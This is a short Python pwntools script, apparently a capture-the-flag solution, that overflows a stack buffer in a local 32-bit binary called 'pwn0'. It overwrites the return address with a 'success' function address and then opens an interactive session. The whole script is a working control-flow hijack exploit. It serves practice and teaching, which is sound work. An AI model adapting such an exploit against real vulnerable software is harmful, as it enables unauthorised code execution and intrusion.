from pwn import *
context(arch='i386',os='linux',log_level='debug')
elf = ELF('pwn0')
io = process(elf.path)

#开启新窗口用于gdb调试
#gdb.attach(io,'b * 0x0804921e') 
success_addr = 0x080491b6
payload = b'a'*0x14 + b'bbbb' + p32(success_addr)
io.sendline(payload)
io.interactive()